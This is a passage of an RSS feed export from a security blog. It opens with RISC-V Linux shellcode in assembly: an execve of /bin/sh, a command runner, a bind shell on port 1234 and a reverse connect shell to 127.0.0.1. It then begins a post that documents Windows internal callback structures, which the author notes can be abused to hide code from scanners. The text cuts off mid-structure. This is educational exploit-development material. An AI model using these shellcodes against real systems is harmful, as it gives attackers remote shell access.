#808030;\">(</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_execve\n    mv     a2<span style=\"color: #808030;\">,</span> x0           # NULL\n    mv     a1<span style=\"color: #808030;\">,</span> x0           # NULL\n    li     a3<span style=\"color: #808030;\">,</span> BINSH        # <span style=\"color: #0000e6;\">\"/bin/sh\"</span>\n    sd     a3<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>         # stores string on <span style=\"color: #004a43;\">stack</span>\n    mv     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>\n    ecall\n</pre>\n<p><!--Created using ToHtml.com on 2022-05-02 21:25:57 UTC --></p>\n<h2>Execute Command</h2>\n<pre style=\"color: #000000; background: #ffffff;\">    # <span style=\"color: #008c00;\">112</span> bytes\n\n    .<span style=\"color: #004a43;\">include</span> <span style=\"color: #0000e6;\">\"include.inc\"</span>\n    \n    .<span style=\"color: #004a43;\">global</span> _start\n    .text\n\n<span style=\"color: #e34adc;\">_start:</span>\n    # execve<span style=\"color: #808030;\">(</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">{</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #0000e6;\">\"-c\"</span><span style=\"color: #808030;\">,</span> cmd<span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">}</span><span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    addi   <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-64</span>           # allocate <span style=\"color: #008c00;\">64</span> bytes of <span style=\"color: #004a43;\">stack</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_execve\n    li     a0<span style=\"color: #808030;\">,</span> BINSH             # a0 <span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">\"/bin/sh\\0\"</span>\n    sd     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>              # store <span style=\"color: #0000e6;\">\"/bin/sh\"</span> on the <span style=\"color: #004a43;\">stack</span>\n    mv     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>\n    li     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x632D</span>            # a1 <span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">\"-c\"</span>\n    sd     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>             # store <span style=\"color: #0000e6;\">\"-c\"</span> on the <span style=\"color: #004a43;\">stack</span>\n    addi   a1<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span>\n    la     a2<span style=\"color: #808030;\">,</span> cmd               # a2 <span style=\"color: #808030;\">=</span> cmd\n    sd     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    sd     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">24</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    sd     a2<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">32</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    sd     x0<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">40</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    addi   a1<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>            # a1 <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">{</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #0000e6;\">\"-c\"</span><span style=\"color: #808030;\">,</span> cmd<span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">}</span>\n    mv     a2<span style=\"color: #808030;\">,</span> x0                # penv <span style=\"color: #808030;\">=</span> NULL\n    ecall \n<span style=\"color: #e34adc;\">cmd:</span>\n    .asciz <span style=\"color: #0000e6;\">\"echo Hello, World!\"</span>\n</pre>\n<p><!--Created using ToHtml.com on 2022-05-02 21:26:45 UTC --></p>\n<h2>Bind Shell</h2>\n<pre style=\"color: #000000; background: #ffffff;\">    # <span style=\"color: #008c00;\">176</span> bytes\n \n    .<span style=\"color: #004a43;\">include</span> <span style=\"color: #0000e6;\">\"include.inc\"</span>\n\n    .<span style=\"color: #004a43;\">equ</span> PORT<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1234</span>\n\n    .<span style=\"color: #004a43;\">global</span> _start\n    .text\n\n<span style=\"color: #e34adc;\">_start:</span>\n    addi   <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-16</span>\n    \n    # s <span style=\"color: #808030;\">=</span> socket<span style=\"color: #808030;\">(</span>AF_INET<span style=\"color: #808030;\">,</span> SOCK_STREAM<span style=\"color: #808030;\">,</span> IPPROTO_IP<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_socket\n    li     a2<span style=\"color: #808030;\">,</span> IPPROTO_IP\n    li     a1<span style=\"color: #808030;\">,</span> SOCK_STREAM\n    li     a0<span style=\"color: #808030;\">,</span> AF_INET\n    ecall\n    \n    mv     a3<span style=\"color: #808030;\">,</span> a0\n    \n    # bind<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> &amp;sa<span style=\"color: #808030;\">,</span> sizeof<span style=\"color: #808030;\">(</span>sa<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;  </span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_bind\n    li     a2<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>\n    li     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>PORT &amp; <span style=\"color: #008000;\">0xFF</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">|</span> <span style=\"color: #808030;\">(</span>PORT <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">|</span> AF_INET<span style=\"color: #808030;\">)</span> \n    sd     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    sd     x0<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    <span style=\"color: #800000; font-weight: bold;\">mv</span>    a1<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>\n    ecall\n  \n    # listen<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_listen\n    li     a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1</span>\n    mv     a0<span style=\"color: #808030;\">,</span> a3\n    ecall\n    \n    # r <span style=\"color: #808030;\">=</span> accept<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_accept\n    mv     a2<span style=\"color: #808030;\">,</span> x0\n    mv     a1<span style=\"color: #808030;\">,</span> x0\n    mv     a0<span style=\"color: #808030;\">,</span> a3\n    ecall\n    \n    mv     a4<span style=\"color: #808030;\">,</span> a0\n \n    # <span style=\"color: #800000; font-weight: bold;\">in</span> <span style=\"color: #004a43;\">this</span> order\n    #\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDERR_FILENO<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDOUT_FILENO<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDIN_FILENO<span style=\"color: #808030;\">,</span>  <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_dup3\n    li     a1<span style=\"color: #808030;\">,</span> STDERR_FILENO <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span>\n<span style=\"color: #e34adc;\">c_dup:</span>\n    mv     a0<span style=\"color: #808030;\">,</span> a4\n    addi   a1<span style=\"color: #808030;\">,</span> a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>\n    ecall\n    bne    a1<span style=\"color: #808030;\">,</span> zero<span style=\"color: #808030;\">,</span> c_dup\n\n    # execve<span style=\"color: #808030;\">(</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li     a7<span style=\"color: #808030;\">,</span> SYS_execve\n    mv     a2<span style=\"color: #808030;\">,</span> x0\n    mv     a1<span style=\"color: #808030;\">,</span> x0\n    li     a0<span style=\"color: #808030;\">,</span> BINSH\n    sd     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    mv     a0<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>\n    ecall\n</pre>\n<p><!--Created using ToHtml.com on 2022-05-02 21:27:16 UTC --></p>\n<h2>Reverse Connect Shell</h2>\n<pre style=\"color: #000000; background: #ffffff;\">    # <span style=\"color: #008c00;\">140</span> bytes\n\n    .<span style=\"color: #004a43;\">include</span> <span style=\"color: #0000e6;\">\"include.inc\"</span>\n\n    .<span style=\"color: #004a43;\">equ</span> PORT<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1234</span>\n    .<span style=\"color: #004a43;\">equ</span> HOST<span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x0100007F</span> # <span style=\"color: #008c00;\">127</span><span style=\"color: #008c00;\">.0</span><span style=\"color: #008c00;\">.0</span><span style=\"color: #008c00;\">.1</span>\n\n    .<span style=\"color: #004a43;\">global</span> _start\n    .text\n\n<span style=\"color: #e34adc;\">_start:</span>\n    addi    <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-16</span>\n    \n    # s <span style=\"color: #808030;\">=</span> socket<span style=\"color: #808030;\">(</span>AF_INET<span style=\"color: #808030;\">,</span> SOCK_STREAM<span style=\"color: #808030;\">,</span> IPPROTO_IP<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li      a7<span style=\"color: #808030;\">,</span> SYS_socket\n    li      a2<span style=\"color: #808030;\">,</span> IPPROTO_IP\n    li      a1<span style=\"color: #808030;\">,</span> SOCK_STREAM\n    li      a0<span style=\"color: #808030;\">,</span> AF_INET\n    ecall\n    \n    mv      a3<span style=\"color: #808030;\">,</span> a0       # a3 <span style=\"color: #808030;\">=</span> s\n    \n    # connect<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> &amp;sa<span style=\"color: #808030;\">,</span> sizeof<span style=\"color: #808030;\">(</span>sa<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li      a7<span style=\"color: #808030;\">,</span> SYS_connect\n    li      a2<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">16</span>\n    li      a1<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>HOST <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">32</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">|</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>PORT &amp; <span style=\"color: #008000;\">0xFF</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">|</span> <span style=\"color: #808030;\">(</span>PORT <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">|</span> AF_INET<span style=\"color: #808030;\">)</span>\n    sd      a1<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    mv      a1<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>       # a1 <span style=\"color: #808030;\">=</span> &amp;sa \n    ecall\n  \n    # <span style=\"color: #800000; font-weight: bold;\">in</span> <span style=\"color: #004a43;\">this</span> order\n    #\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDERR_FILENO<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDOUT_FILENO<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    # dup3<span style=\"color: #808030;\">(</span>s<span style=\"color: #808030;\">,</span> STDIN_FILENO<span style=\"color: #808030;\">,</span>  <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li      a7<span style=\"color: #808030;\">,</span> SYS_dup3\n    li      a1<span style=\"color: #808030;\">,</span> STDERR_FILENO <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span>\n<span style=\"color: #e34adc;\">c_dup:</span>\n    mv      a2<span style=\"color: #808030;\">,</span> x0\n    mv      a0<span style=\"color: #808030;\">,</span> a3\n    addi    a1<span style=\"color: #808030;\">,</span> a1<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>\n    ecall\n    bne     a1<span style=\"color: #808030;\">,</span> zero<span style=\"color: #808030;\">,</span> c_dup\n\n    # execve<span style=\"color: #808030;\">(</span><span style=\"color: #0000e6;\">\"/bin/sh\"</span><span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">,</span> NULL<span style=\"color: #808030;\">)</span><span style=\"color: #696969;\">;</span>\n    li      a7<span style=\"color: #808030;\">,</span> SYS_execve\n    li      a0<span style=\"color: #808030;\">,</span> BINSH\n    sd      a0<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #000080;\">sp</span><span style=\"color: #808030;\">)</span>\n    mv      a0<span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">sp</span>\n    ecall\n</pre>\n<p><!--Created using ToHtml.com on 2022-05-02 21:27:49 UTC --></p>\n<h2>Further Reading</h2>\n<ul>\n<li><a href=\"https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html\">Basic Shellcode in RISC-V Linux</a></li>\n<li><a href=\"https://www.usenix.org/system/files/woot19-paper_barral.pdf\">RISC-V: #AlphanumericShellcoding</a></li>\n<li><a href=\"https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/\">[DEFCON 2020 Quals] &#8211; nooopsled</a></li>\n<li><a href=\"https://github.com/TheThirdOne/rars\">RARS &#8212; RISC-V Assembler and Runtime Simulator</a></li>\n</ul>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/feed/",
            "slash_comments": "0",
            "media_content": [
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Windows Data Structures and Callbacks, Part 1",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Windows Data Structures and Callbacks, Part 1"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/",
            "comments": "https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/#respond",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Thu, 06 Aug 2020 20:20:02 +0000",
            "published_parsed": [
                2020,
                8,
                6,
                20,
                20,
                2,
                3,
                219,
                0
            ],
            "tags": [
                {
                    "term": "data structures",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "redteam",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "callbacks",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "wer",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=5102",
            "guidislink": false,
            "summary": "Windows Data Structures and Callbacks, Part 1 Contents Introduction Function Table List Event Tracing DLL Notifications Secure Memory Configuration Manager (CM) Vectored Exception Handling (VEH) Windows Error Reporting (WER) 1. Introduction A process can contain thousands of pointers to executable &#8230; <a href=\"https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Windows Data Structures and Callbacks, Part 1 Contents Introduction Function Table List Event Tracing DLL Notifications Secure Memory Configuration Manager (CM) Vectored Exception Handling (VEH) Windows Error Reporting (WER) 1. Introduction A process can contain thousands of pointers to executable &#8230; <a href=\"https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<p>Windows Data Structures and Callbacks, Part 1</p>\n<h2>Contents</h2>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#intro\">Introduction</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#ftl\">Function Table List</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#etw\">Event Tracing</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#dll\">DLL Notifications</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#smc\">Secure Memory</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#cfm\">Configuration Manager (CM)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#veh\">Vectored Exception Handling (VEH)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#wer\">Windows Error Reporting (WER)</a></li>\n</ol>\n<h2 id=\"intro\">1. Introduction</h2>\n<p>A process can contain thousands of pointers to executable code, some of which are stored in opaque, but writeable data structures only known to Microsoft, a handful of third party vendors and of course bad guys that want to hide malicious code from memory scanners. This post documents what some of the data structures contain rather than PoCs to demonstrate code redirection or evasion, which I probably won&#8217;t discuss much anymore. The names of some structure fields won&#8217;t be entirely accurate, but feel free to <a href=\"https://modexp.wordpress.com/about/\">drop me an email</a> if you think something needs correcting. No, I don&#8217;t have access to source code. These structures were reverse engineered or can be found on MSDN.</p>\n<h2 id=\"ftl\">2. Dynamic Function Table List</h2>\n<p><strong><var>ntdll!RtlpDynamicFunctionTable</var></strong> contains DYNAMIC_FUNCTION_TABLE entries and callback functions for a range of memory that can be installed using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlinstallfunctiontablecallback\">ntdll!RtlInstallFunctionTableCallback</a>. <a href=\"https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlgetfunctiontablelisthead\">ntdll!RtlGetFunctionTableListHead</a> returns a pointer to the list and since NTDLL.dll uses the same base address for each process, you can read entries from a remote process very easily.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">enum</span> _FUNCTION_TABLE_TYPE <span style=\"color: #800080;\">{</span>\n    RF_SORTED<span style=\"color: #808030;\">,</span>\n    RF_UNSORTED<span style=\"color: #808030;\">,</span>\n    RF_CALLBACK\n<span style=\"color: #800080;\">}</span> FUNCTION_TABLE_TYPE<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> PRUNTIME_FUNCTION <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">CALLBACK</span> <span style=\"color: #808030;\">*</span>PGET_RUNTIME_FUNCTION_CALLBACK<span style=\"color: #808030;\">)</span>\n  <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span> ControlPc<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">PVOID</span> Context<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _DYNAMIC_FUNCTION_TABLE <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>                      Links<span style=\"color: #800080;\">;</span>\n    DWORD64                         TableIdentifier<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LARGE_INTEGER</span>                   TimeStamp<span style=\"color: #800080;\">;</span>\n    DWORD64                         MinimumAddress<span style=\"color: #800080;\">;</span>\n    DWORD64                         MaximumAddress<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                           BaseAddress<span style=\"color: #800080;\">;</span>\n    PGET_RUNTIME_FUNCTION_CALLBACK  Callback<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PCWSTR</span>                          OutOfProcessCallbackDll<span style=\"color: #800080;\">;</span>\n    FUNCTION_TABLE_TYPE             Type<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                           EntryCount<span style=\"color: #800080;\">;</span>\n    ULONG64                         UnknownStruct<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>  <span style=\"color: #696969;\">// referenced by RtlAvlInsertNodeEx         </span>\n<span style=\"color: #800080;\">}</span> DYNAMIC_FUNCTION_TABLE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PDYNAMIC_FUNCTION_TABLE<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:41:51 UTC --></p>\n<h2 id=\"etw\">3. Event Tracing</h2>\n<p>Microsoft recommends against using it, but <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-settracecallback\">sechost!SetTraceCallback</a> can still receive ETW events. Entries of type EVENT_CALLBACK_ENTRY are located at <strong><var>sechost!EtwpEventCallbackList</var></strong>.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #603000;\">VOID</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">CALLBACK</span> PEVENT_CALLBACK<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>PEVENT_TRACE pEvent<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #603000;\">ULONG</span> WMIAPI SetTraceCallback<span style=\"color: #808030;\">(</span>\n    LPCGUID         pGuid<span style=\"color: #808030;\">,</span>\n    PEVENT_CALLBACK EventCallback<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _EVENT_CALLBACK_ENTRY <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>      ListHead<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">GUID</span>            ProviderId<span style=\"color: #800080;\">;</span>\n    PEVENT_CALLBACK Callback<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> EVENT_CALLBACK_ENTRY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PEVENT_CALLBACK_ENTRY<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:42:07 UTC --></p>\n<h2 id=\"dll\">4. DLL Notifications</h2>\n<p>It&#8217;s possible to receive notifications about a DLL being loaded or unloaded using <a href=\"https://docs.microsoft.com/en-us/windows/win32/devnotes/ldrregisterdllnotification\">ntdll!LdrRegisterDllNotification</a>. It&#8217;s used to hook API for Common Language Runtime (CLR) in <a href=\"https://github.com/endgameinc/ClrGuard\">ClrGuard</a>. Entries of type LDR_DLL_NOTIFICATION_ENTRY can be located at <strong><var>ntdll!LdrpDllNotificationList</var></strong>.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _LDR_DLL_LOADED_NOTIFICATION_DATA <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">ULONG</span>           Flags<span style=\"color: #800080;\">;</span>             <span style=\"color: #696969;\">// Reserved.</span>\n    PUNICODE_STRING FullDllName<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The full path name of the DLL module.</span>\n    PUNICODE_STRING BaseDllName<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The base file name of the DLL module.</span>\n    <span style=\"color: #603000;\">PVOID</span>           DllBase<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// A pointer to the base address for the DLL in memory.</span>\n    <span style=\"color: #603000;\">ULONG</span>           SizeOfImage<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The size of the DLL image, in bytes.</span>\n<span style=\"color: #800080;\">}</span> LDR_DLL_LOADED_NOTIFICATION_DATA<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PLDR_DLL_LOADED_NOTIFICATION_DATA<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _LDR_DLL_UNLOADED_NOTIFICATION_DATA <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">ULONG</span>           Flags<span style=\"color: #800080;\">;</span>             <span style=\"color: #696969;\">// Reserved.</span>\n    PUNICODE_STRING FullDllName<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The full path name of the DLL module.</span>\n    PUNICODE_STRING BaseDllName<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The base file name of the DLL module.</span>\n    <span style=\"color: #603000;\">PVOID</span>           DllBase<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// A pointer to the base address for the DLL in memory.</span>\n    <span style=\"color: #603000;\">ULONG</span>           SizeOfImage<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// The size of the DLL image, in bytes.</span>\n<span style=\"color: #800080;\">}</span> LDR_DLL_UNLOADED_NOTIFICATION_DATA<span style=\"color: #808030;\">,</span> <span style=\"color: 